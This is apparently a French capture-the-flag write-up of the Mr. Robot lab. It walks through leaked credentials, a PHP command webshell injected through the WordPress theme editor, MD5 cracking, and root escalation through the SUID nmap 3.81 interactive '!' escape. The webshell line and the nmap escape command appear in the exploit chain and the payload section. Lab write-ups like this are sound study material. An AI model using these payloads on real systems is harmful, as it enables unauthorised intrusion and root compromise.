---
doc_kind: writeup
title: "ThunderCipher Mr. Robot - WordPress theme editor RCE puis evasion SUID nmap 3.81"
category: web
slug: mrrobot-wp-theme-rce-suid-nmap-escape
created: 2026-10-29
status: solved
tags:
  - wordpress-theme-editor
  - md5-crack
  - suid-nmap-escape
  - interactive-shell-breakout
source: thundercipher.in/labs
target: "WordPress theme editor + nmap SUID ancien"
---
# ThunderCipher Mr. Robot - WordPress theme editor RCE puis evasion SUID nmap 3.81

## Challenge Summary

- Source: thundercipher.in/labs
- Target: WordPress theme editor + nmap SUID ancien
- Goal: robots.txt fuite un flag et une wordlist; un fichier license.txt contient des creds admin en base64; l'editeur de theme WordPress donne une RCE PHP; nmap 3.81 SUID permet une evasion interactive.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. robots.txt -> wordlist + flag direct.
2. license.txt -> creds base64 decodes.
3. Login WP -> editeur de theme -> injection PHP system($_GET['c']).
4. RCE -> lecture d'un hash MD5 systeme -> cracke (rockyou) -> mot de passe.
5. Script pty + su -> flag user.
6. nmap SUID 3.81 -> mode interactif nmap> !cat /root/root.txt -> flag root.

## Key Evidence

- Hash MD5 cracke donnant le mot de passe systeme; sortie nmap> !cat /root/root.txt confirmant l'evasion SUID.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
Injection <?php system(urldecode($_GET['c'])); ?> dans le theme; echappement interactif nmap (!cat) via binaire SUID.
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- Editeur de theme WordPress = RCE directe des acces admin, meme sans plugin vulnerable; tout binaire ancien SUID avec mode interactif (nmap <3.9x, vim, etc.) doit etre teste pour evasion shell via ! ou :!.

## Pattern Candidates

- Voir pattern associe de meme slug.
